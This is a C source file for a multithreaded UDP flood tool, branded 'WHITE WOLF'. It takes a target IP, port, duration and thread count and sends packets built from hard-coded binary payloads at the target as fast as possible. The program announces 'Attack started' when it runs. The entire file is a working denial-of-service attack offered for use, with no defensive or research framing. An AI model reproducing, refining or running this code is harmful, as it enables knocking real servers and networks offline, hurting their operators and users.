#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/types.h>
#include <signal.h>

#define PACKET_SIZE 1400  // Adjust as needed
#define MAX_THREADS 1024  // Adjust as needed based on system capabilities

// ANSI color codes
#define RESET       "\033[0m"
#define CYAN        "\033[36m"
#define BOLD        "\033[1m"

char *ip;
int port;
int duration;
volatile sig_atomic_t stop_flag = 0;

// Define a struct to hold each payload and its length
typedef struct {
    char *data;
    size_t length;
} Payload;

// Define the payloads
char *raw_payloads[] = {
    "\xd9\x00",
    "\x00\x00",
    "\xd9\x00",
    "\x00\x00",
    "\xd9\x00\x00",
    "\x7C\xC0\xEF\x20\x40\x8F\x12\xAF\xA1\x69\xA3\x1D\xB7\xCE\xA5\xEF\xBB\xC7\xD1\x2E\x54\x07\x42\x35\x7C\x0E\xF2\xEC\xCB\xFD\x20\xE3\xC3\x4A\xA1\x5A\x39\xB6\x1C\x7D\xD6\xFA\xE2\x1E\x6F\xBF\x45\x75\x03\xDB\x01\x1D\xF2\xF1\x35\x67\xFE\x4B\xD8\x2E\xED\xAB\x20\x74\xB2\xC2\x7A\xAE\xD6\xB9\xB5\xB6\x9C\xC2\x6B\x4F\x61\x80\x97\x22\x8E\x84\x55\x8C\x23\xF0\x26\xD0\xB5\x08\x33\x88\x4D\xCA\xCE\xAD\x24\x67\xDC\x4C\x45\x67\x23\xE0\x08\x2C\x4F\x4A\x61\x8D\xB6\xBD\xFB\xCB\xBC\xB7\x36\x5F\x83\xB3\x73\xD1\x1A\x70\x93\x42\x23\x4B\xB6\x0B\xB2\xFD\xB3\xA7\x95\x78\xD4\x2A\xA9\xD6\x37\x64\x60\x12\x58\xFF\x1A\x4C\x59\x8A\xE8\x13\xD1\x72\xA9\xCE\x2B\x1F\x55\xA4\x30\x98\x4A\xED\x4C\x3C\x6D\x61\x2A\x4F\x32\x9B\x99\x14\xA0\xBD\xEC\x3A\x80\x50\x76\x91\x76\x50\x49\xBF\xF2\xB1\x8E\x06\xD0\xBE\xEA\x20\x96\x62\xA6\x28\xC9\xCF\x8D\xD8\xE5\x82\x4C\x9C\xC6\x61\x8A\x79\x43\xD9\xD4\xE2\xFF\xE0\x9B\x95\xF3\x98\x6D\x7A\x8F\xC2\xDC\x00\x58\x85\xD8\x28\x27\x6A\xD2\x2E\x92\xDA\xB3\xB6\xDB\x05\x98\xCC\xC3\x4B\x77\x1E\x2C\x9E\x11\x3D\xD2\x00\x6A\x52\x69\xDA\x5C\x8F\x88\x45\xD2\xC2\x82\x1A\x4B\xB9\xE5\xF8\x5A\x6A\xFD\xA8\x18\x7B\x72\x52\x11\x73\xE9\xA6\xA9\xA6\x57\x21\xCD\x2F\x08\x0E\xD9\xFA\x6B\xD0\xAE\x1D\x86\xDD\xA5\x03\x30\x22\xBE\x84\xAE\xFF\x07\xBE\xB8\x50\xDE\x99\xBD",
    "\x7C\xC0\xEF\x20\x40\x8F\x12\xAF\xA1\x69\xA3\x1D\xB7\xCE\xA5\xEF\xBB\xC7\xD1\x2E\x54\x07\x42\x35\x7C\x0E\xF2\xEC\xCB\xFD\x20\xE3\xC3\x4A\xA1\x5A\x39\xB6\x1C\x7D\xD6\xFA\xE2\x1E\x6F\xBF\x45\x75\x03\xDB\x01\x1D\xF2\xF1\x35\x67\xFE\x4B\xD8\x2E\xED\xAB\x20\x74\xB2\xC2\x7A\xAE\xD6\xB9\xB5\xB6\x9C\xC2\x6B\x4F\x61\x80\x97\x22\x8E\x84\x55\x8C\x23\xF0\x26\xD0\xB5\x08\x33\x88\x4D\xCA\xCE\xAD\x24\x67\xDC\x4C\x45\x67\x23\xE0\x08\x2C\x4F\x4A\x61\x8D\xB6\xBD\xFB\xCB\xBC\xB7\x36\x5F\x83\xB3\x73\xD1\x1A\x70\x93\x42\x23\x4B\xB6\x0B\xB2\xFD\xB3\xA7\x95\x78\xD4\x2A\xA9\xD6\x37\x64\x60\x12\x58\xFF\x1A\x4C\x59\x8A\xE8\x13\xD1\x72\xA9\xCE\x2B\x1F\x55\xA4\x30\x98\x4A\xED\x4C\x3C\x6D\x61\x2A\x4F\x32\x9B\x99\x14\xA0\xBD\xEC\x3A\x80\x50\x76\x91\x76\x50\x49\xBF\xF2\xB1\x8E\x06\xD0\xBE\xEA\x20\x96\x62\xA6\x28\xC9\xCF\x8D\xD8\xE5\x82\x4C\x9C\xC6\x61\x8A\x79\x43\xD9\xD4\xE2\xFF\xE0\x9B\x95\xF3\x98\x6D\x7A\x8F\xC2\xDC\x00\x58\x85\xD8\x28\x27\x6A\xD2\x2E\x92\xDA\xB3\xB6\xDB\x05\x98\xCC\xC3\x4B\x77\x1E\x2C\x9E\x11\x3D\xD2\x00\x6A\x52\x69\xDA\x5C\x8F\x88\x45\xD2\xC2\x82\x1A\x4B\xB9\xE5\xF8\x5A\x6A\xFD\xA8\x18\x7B\x72\x52\x11\x73\xE9\xA6\xA9\xA6\x57\x21\xCD\x2F\x08\x0E\xD9\xFA\x6B\xD0\xAE\x1D\x86\xDD\xA5\x03\x30\x22\xBE\x84\xAE\xFF\x07\xBE\xB8\x50\xDE\x99\xBD",
    "\x47\x55\xD9\x7D\x11\x8F\x7B\x1A\x17\xA7\x36\x4B\x4C\xB4\xBF\x39\xD9\xA5\x91\x6E\xA6\x6A\x8B\x3D\x6A\x43\x28\xFD\xCF\xD6\x23\x5E\x6D\xD9\xD6\x73\xF4",
    "\x2A\xB5\x5D\xDC\xCC\xE0\xC8\x42\x98\x54\x1F\x63\x5C\x43\xAF\x67\x1E\x99\x4F\xF6\xB3\x0F\xA2\x88\x47\x22\x7A\x3F\x49\xD5\xBB\x58\x72\xBA\x54\x16\x98\x1B\xB5\xC1\x85\x93\x4A\x63\xC5\x81\x4A\xB4\xA6\x41",
    "\xEF\x56\x1C\x10\xA1\x91\x25\x08\xE3\x26\x0F\xCE\x33\x9F\x6C\x3D\xD1\x09\x63\x22\xAE\x99\x83\xD0\x2A\x8A\xB8\xC4\x40\x4D\xAC\xFD\xF6\x91\x22\x15\x6E\x32\x09\xCD\xF8\xCB\x13\x3D\x97\xCC\x14\x9F\xC3\x54\xC2\x00\xDD\x43\x52",
    "\xAB\x56\xE9\x7F\x11\x8F\x7B\x1A\x17\xE7\x2D\x17\x97\x40\x88\xF5\x11\xF3\x60\x52\x81\x11\xAA\xE0\x30\x40\x0D\xE7\x35\xE7\x9C\x6B\xD8\x1E\xDC\x4E\x34\x76\xCE\xDD\xC8\xA7\xEB\x13\x6D\x67\xC9\xA7\xCA\x3E\x06\x00\xEB\xC7\xF9\xC8\x2A\xD0",
    "\x63\x55\xD9\x7D\x11\xB1\x7B\x1B\x17\xA7\xB6\xCF\x48\xB4\x2E\x62\xD9\xA5\x91\x6E\xA6\xEA\x0A\x3B\x6A\x53\x28\xBE\x2C\x9D\x09\x76\xA3\xDB\x1C\x01\x1F\x59\xCF\x31\x4C\xEE\x5E\x8C\x1C\xA8\x4E\x3B\x53\x28\x19\xB9\x5A\xC5\x69\x8D\x29\xF6\xA9\xF1\xAD\xE6",
    "\x63\x55\xD9\x7D\x11\xB1\x7B\x1B\x17\xA7\xB6\xCF\x48\xB4\x2E\x62\xD9\xA5\x91\x6E\xA6\xEA\x0A\x3B\x6A\x53\x28\xBE\x2C\x9D\x09\x76\xA3\xDB\x1C\x01\x1F\x59\xCF\x31\x4C\xEE\x5E\x8C\x1C\xA8\x4E\x3B\x53\x28\x19\xB9\x5A\xC5\x69\x8D\x29\xF6\xA9\xF1\xAD\xE6",
    "\xAF\x56\xD9\x7C\x71\x8A\x8B\x18\x17\xA7\x36\x13\x77\xB4\xA4\x1C\xDC\xA5\x91\x6E\xA6\x02\x53\x6E\xE5\xE3\xF0\xDD\x07\x25\x78\xE7\x6B\xAD\xD9\x74\xE4\x55\x90\xC4\x2C\x66\xD1\xBD\x84\x07\xA3\x52\xF8\x60\xAB\x3E\x96\xD5\x4D\xB4\xCF\x31\x9A\x94\xAC\x76\xA7\x3F\x55\x58\x7C\xB7",
    "\x70\xD3\xEE\x36\x4A\x0B\xDD\x6A\xA3\xF0\x66\xE6\x98\x42\xA2\xEB\x6E\x55\x56\xC2\xBE\x8F\xA0\x92\x5E\xF5\x4F\xC0\x6E\xB6\x5E\xBB\x43\x18\xC3\x1C\x2B\x04\xDA\xDE\xEA\x10\x8A\xF2\xB9\xAB\x71\x7B\xA4\x46\x5F\xDD\x3A\x4D\xA7\xA5\x4C\x32\x29\x7A\x4E\x1D",
    "\xB3\x56\xE9\x7F\x11\x8E\xFB\x1A\x17\xE7\x4D\x67\x90\x00\xC5\xF5\x11\x41\x60\x52\x71\xC1\xB7\xE0\x90\x41\x6D\xE7\x35\x52\x1D\x89\x38\x96\x55\xD2\x17\x5E\x7B\xCD\xE4\xC1\x55\x86\x28\xD8\xED\x03\x16\x58\xCF\xF7\xED\x65\x6F\xB7\x0A\x10\x17\x38\x2A\xA0\x8C\x33\xFA\xB5\xA7\x84\xE3\xD1\xF3\x67\x63",
    "\xEF\x8D\x75\xC9\x99\x4C\x65\x0C\xF7\xB7\xCF\xF3\x59\x03\x9E\x2A\xB1\xBA\x41\xAA\x00\x42\x85\xE0\x9E\x60\x28\x3A\x72\x3C\xB0\x68\xB2\xE7\xA1\x44\x36\xC3\x0E\x99\x0B\x17\xF9\xB9\xE1\x6A\xA4\xBB\xE6\x98\x96\xA5\x8B\x5E\xBE\xB0\xEF\x58\x9A\x53\x18\xD5\x7A\xC2\x38\xD4\x16\xBA\xA7\xD9\x58\x60\x57\x3F\x8B\x91\xC6\xF2\x1D\x61\x62\x60\xB6\x71\x2A\xC0\x35\xA4\x7A\x16\xD0\xF5\x2C\xF6\x87\x9A",
    "\xE3\x55\x31\x7F\x71\x3E\x11\x0E\x0D\x43\x1F\x14\x69\xB0\x2D\x09\xC3\x70\xC8\xF6\x35\x40\x86\xE0\x6A\x3F\xE5\x34\x2E\x56\xBC\xFA\x50\xAD\xA5\xD5\x8A\xDC\x15\x17\x92\xF8\xB0\xE9\x74\x42\xD4\xC6\x40\xF8\x6C\x70\x01\x23\x35\xB4\xB0\x2F\x49\x14\x1A\xC3\xDC\x98\x91\x5E\xD3\x8A\xAC\x25\x27\x12\x76\x3A\x17\x57\xCD\x7C\x4C\xE1\xE2\x57\xF9\xB7\x4F\x71\x39\x24\xC8\x23\x29\x3E\x46\x7A\xA0\xDE\x1A\x17\x7A\x16\x05\x43\x5C\x94\x1F\x1B\x34\x1D\x4A\x35\x7D\xAD\x39\x3E\x9E\xA3\x53\x5B\x7E\x36\xF7\xDA\xEB\x0B\xB9\x6B\x3C\x09\x59\x07\x75\xFE\xFB\x76\x09\xAB\xDB\xF4\x37\x7A\xED\x24\x99\x04\x57\x8D\x4E\x5E\x8D\x5F\x30\xFB\x56\xF7\xEB\x9B\xB8\x2A\xDF\x21\xEA\x75\x52\xF8\xE9\x65\xB7\xA7\xD3\x65\xC6\x14\x4C\xE6\xCB\x25\x2B\xCD\x0D\xFA\x4B\x2A\xD0\x17\x95\x32\x24\x00\xED\x74\xE6\x8A\x40\x48\x60\xAF\x5F\x58\x31\xD8\xD9\xF7\xBB\xDB\x01\x44\xCE\x96\x2F\xA0\x3D\x9B\x07\x13\xB1\xD0\x82\x1F\x6E\xF7\x3D\xA9\xB3\x30\x19\x19\x04\x3B\x07\x0E\xF5\xEB\x8A\x74\xE4\xB0\x55\xF8\x61\xEE\xDE\x8B\xF7\x0A\x2F\x87\xAF\xF0\x32\x1F\x0B\xEE\x19\x47\x8F\x57\xAE\xD2\x58\xDD\xA7\x42\xC4\x06\xA1\xC6\x1F\x75\xC0\x35\x16\xEA\x61\x7F\xCA\xBE\x26\xF6\x51\xA6\x02\x36\xEA\x06\x10\x89\x78\x5A\x26\xEB\xC9\x39\x5B\x53\x1E\xF7\x1F\x65\x07\xDF\xA2\x53\x62\xF7\xAE\x65\xD3\x69\x08\x76\x8A\xED\x6F\xAA\xD8\x5F\xC2\x8F\xC9\x01\xD4\x9C\xF2\x17\x9D\x02\x12\x09\x97\xCE\x34\x7A\xE5\xF3\xD9\x3B\x4C\x36\x1D\xC9\x0F\x84\x7D\xF1\x00\x2A\x9D\xB3\xE0\xCE\xAF\xEE\xF4\x16\xD0\xDD\xF1\x85\x80\x5F\xDD\x3D\xC1\x55\x7A\x32\x55\xB6\x63\x45\x23\x45\x86\x4D\x2A\x41\x5B\x71\x31\x5A\x4F\x95\x33\x2E\xE2\xE0\x71\x75\x9C\x76\x12\xAE\xFD\xF2\x60\x63\x60\xBA\x5A\xDB\x81\x0A\x0D\x52\xB1\x90\xB1\x0A\x94\xC5\xE6\x8B\x77\x44\x71\xEF\x14\xD2\x67\xB3\x77\x18\x7B\xAB\xC6\x83\x8A\xBC\xE7\xCF\x49\x93\x87\x8D\x14\x18\xD4\x78\x24\xC2\xD2\x5C\x8C\x44\x5B\x50\x5A\xDF\x39\x84\xA3\x82\x71\x50\xE0\xD0\x11\x34\x66\x44\x92\xFB\x2B\xC5\xFE\x1F\xB0\xA4",
    "\xEF\x8D\x75\xC9\x85\x4C\x65\x0C\xF7\xB7\xCF\xF3\x59\x03\x9E\x2A\xB1\xBA\x41\xAA\x00\x42\x85\xE0\x9E\x60\xDC\x01\x6C\x47\x41\x74\x39\xEA\x94\x96\xEE\xCF\x22\x8D\x4D\x46\x6D\x25\x15\xC8\x4A\x55\x20\x9C\x09\x7D\x1A\x2E\x5B\xC3\xEA\xD6\xF9\x44\x1A\x95\x1C\x6B\x46\x87\x8B\xB8\x6D\x85\x1F\xAB\x67\x35\x07\x7A\xD5\x42\x15\xEF\x61\x26\x90\x0C\xFD\xCA\x1E\xF8\x28\xFF\x81\x83\x12\x0E\xCA\x95\xA9\x13\x7A\x56\x3D\x84\x1F\x0C\xB1\x5B\xE7\x37\xCF\xB3\x7D\xAD\x39\xBE\x91\x22\x50\x26\xFD\x27\xF7\xDA\xEB\x2A\x11\x44\x9D\x39\x6F\xBD\xC1\x4F\x54\xD7\x3E\x9C\x61\x44\x03\xCD\xDF\x9D\x36\xBD\xE1\xBD\x78\xE8\xF2\xD5\xDD\x9E\xED\x5B",
    "\xA3\x56\x21\x7E\x31\x3E\xA1\x0D\x75\xEB\xB7\x99\x95\x7F\x60\x93\x54\xBD\x55\x5B\x0F\xA0\x6B\x96\x15\x32\xB8\x38\x72\x04\x59\xF9\x14\x34\x39\x7F\x28\x5E\xFF\x95\x66\x47\xB7\xF1\x4A\xDC\x15\x96\x66\x2B\xAA\x8B\x4B\x92\x1E\x26\x4C\xF2\xF9\x13\x2A\xE9\xE0\xEF\x38\x57\x11\xD4\x63\xBB\xD6\x3E\x66\x05\xE2\x2B\xAF\xD5\xB6\xC3\x31\x27\x8F\x61\x69\x84\x28\x6A\x5A\x23\x71\xB6\x81\x5A\xD2\x95\xC9\x12\xEC\x15\xB9\xD5\x17\x3C\xB1\x71\x06\x34\xCE\xBF\xAD\x6D\xE5\x05\x7D\x64\xF9\xA7\xD4\xE8\xF7\xD2\xBF\x0F\x10\x04\x96\xB9\xE5\x45\x41\x4F\x57\xE3\xBC\xC2\x4E\x3B\x0A\xA8\xBF\x57\x05\xBD\x43\x4A\x59\xEA\xCA\x40\xBA\x2D\xE8\x55\xC7\x47\x80\x64\x6B\x36\x35\x11\x3B\xFD\x61\x32\xBD\xF9\x03\x35\xD6\x34\x3C\xCA\x5A\x2B\x5F\x0C\xF0\x9C\x13\xD6\xEE\xD1\x06\x88\x46\xD3\xFD\x21\x68\x68\xC0\x0F\x7B\x71\x84\x1E\x04\x46\xC7\xDB\x43\x5F\x92\xFF\xC6\x5E\xAD\x66\xDC\x0B\xBA\xDC\x15\x82\x62\x28\x1C\x05\xB2\xDA\xAF\x2A\x1B\x30\xE0\xBA\xFD\x1F\x1A\x4A\x7C\xF0\xC3\xB8\x15\x90\x07\x84\x86\x4B\xF1\xC4\x9D\x86\x86\xA1\x1E\xB5\x46\xB7\x36\xBE\x30\x39\x66\x0D\xE3\xAD\xC9\xB4\x83\x88\xD0\x71\xB0\x7A\xC0\xAD\x17\x66\xA2\xDC\xC8\xA6\xEE\x6C\xA1\xF5\xC5\xDD\xEA\xE4\x29\x78\x56\x0E\x7E\x4C\xBB\xC3\xB8\x36\xC2\xE2\xED\x2A\x33\x77\x71\x7F\x50\xC1\x7E\x7B\xD3\x65\x1D\x8A\x4B\x6D\x4C\xE8\x8A\x54\x29\x11\x85\x7B\x05\x73\xAB\x91\x19\xEC\x8A\x11\x9E\xFA\xFA\x45\xEE\x13\x1a\x8E\x6C\xCA\xB4\xD9\x0A\xA2\xAE\xA7\xBC\xDB\xAD\xE0\xD9\xFF\x91\x1B\x8E\x94\x68\x51\x95\xE1\xC9\xA6\x5B\xDA\xDE\xB7\x03\x1D\xB1\x49\x9C\x91\xCA\x47\x6B\x4C\xBA\x50\x64\xC1\x05\xF9\x13\x2A\xCB\xCB\x9A\x95\x26\xA1\xFE\xA9\x45\x5E\x4E\x02\x60\x4B\x5F\xAF\x69\x40\xFF\xAF\x0F\xD2\x73\xB6\x31\x48\xAE\x42\xE0\x2B\xD0\xB5\xB0\x72\x51\x3A\xC6\x79\x97\xA0\xF7\xA8\x9D\x23\xDD\x59\x3A\x97\x28\x53\xB9\xA0\xE6\x6D\x65\x63\x54\xD0\xD8\x10\x8B\xF8\x63\x10\x6A\xF2\x28\x31\x3A\xDF\x71\x80\x1D\x10\x0C\xFA\x73\x84\x92\x76\xA4\x89\x6E\xFB\xD3\xBA\x03\x81\x20\x16",
    "\x98\x4D\x6F\x53\x61\x17\xE4\xA6\x05\xF5\x8B\x7C\xA6\x17\xA3\x81\x12\x56\xA7\x1D\xD9\x39\xB1\xBC\xBF\x9D\x30\xA7\x18\xFF\xFB\xD4\x7A\xC1\xDE\xD5\xE7\x93\xE2\xD5\x50\x53\xCF\x76\x30\x66\x89\x0F\xFB\xDF\xFF\x39\x9C\x77\xC9\x90\x17\xA6\x10\x5A\xA7\x2E\x1B\xB5\x4C\x8D\x93",
     
};

// Calculate the number of payloads
size_t num_payloads = sizeof(raw_payloads) / sizeof(raw_payloads[0]);

// Create an array of Payload structs
Payload payloads[sizeof(raw_payloads) / sizeof(raw_payloads[0])];

// Function to initialize the payloads with their lengths
void initialize_payloads() {
    for (int i = 0; i < num_payloads; i++) {
        payloads[i].data = raw_payloads[i];
        payloads[i].length = strlen(raw_payloads[i]);
    }
}

void *send_udp_traffic(void *arg) {
    int sock;
    struct sockaddr_in server_addr;
    ssize_t sent_bytes;
    cpu_set_t cpuset;

    // Set thread affinity to the current CPU
    CPU_ZERO(&cpuset);
    CPU_SET(sched_getcpu(), &cpuset);
    if (pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset) != 0) {
        perror("pthread_setaffinity_np failed");
        pthread_exit(NULL);
    }

    // Create socket
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set socket send buffer size
    int sndbuf_size = 1024 * 1024; // 1MB
    if (setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sndbuf_size, sizeof(sndbuf_size)) < 0) {
        perror("Failed to set SO_SNDBUF");
        close(sock);
        pthread_exit(NULL);
    }

    // Set up server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    // Prepare packet
    char packet[PACKET_SIZE];
    size_t offset = 0;
    while (offset < PACKET_SIZE) {
        for (int i = 0; i < num_payloads && offset < PACKET_SIZE; i++) {
            size_t to_copy = payloads[i].length;
            if (offset + to_copy > PACKET_SIZE) {
                to_copy = PACKET_SIZE - offset;
            }
            memcpy(packet + offset, payloads[i].data, to_copy);
            offset += to_copy;
        }
    }

    // Timing variables
    time_t start_time = time(NULL);
    time_t end_time = start_time + duration;

    // Main loop
    while (!stop_flag) {
        sent_bytes = sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("Send failed");
            break;
        }
        // Check time every 1000 iterations to reduce overhead
        static int check_counter = 0;
        if (++check_counter >= 1000) {
            if (time(NULL) >= end_time) {
                break;
            }
            check_counter = 0;
        }
    }

    // Cleanup
    if (close(sock) < 0) {
        perror("Failed to close socket");
    }
    pthread_exit(NULL);
}

void signal_handler(int signum) {
    stop_flag = 1;
}

int main(int argc, char *argv[]) {
    if (signal(SIGINT, signal_handler) == SIG_ERR) {
        perror("Signal setup failed");
        exit(EXIT_FAILURE);
    }

    if (argc != 5) {
        fprintf(stderr, "Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    ip = argv[1];
    port = atoi(argv[2]);
    duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    if (threads > MAX_THREADS) {
        fprintf(stderr, "Threads limited to %d\n", MAX_THREADS);
        threads = MAX_THREADS;
    }

    initialize_payloads();
    printf(CYAN BOLD
           "██╗    ██╗ ██████╗ ██╗     ███████╗\n"
           "██║    ██║██╔═══██╗██║     ██╔════╝\n"
           "██║ █╗ ██║██║   ██║██║     █████╗  \n"
           "██║███╗██║██║   ██║██║     ██╔══╝  \n"
           "╚███╔███╔╝╚██████╔╝███████╗██║     \n"
           " ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝     \n"
           RESET);
    printf("\033[33mAttack started by WHITE WOLF\n\033[0m");
    fflush(stdout);

    pthread_t tid[threads];

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&tid[i], NULL, send_udp_traffic, NULL) != 0) {
            perror("Thread creation failed");
            stop_flag = 1;
            for (int j = 0; j < i; j++) {
                pthread_cancel(tid[j]);
                pthread_join(tid[j], NULL);
            }
            exit(EXIT_FAILURE);
        }
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}
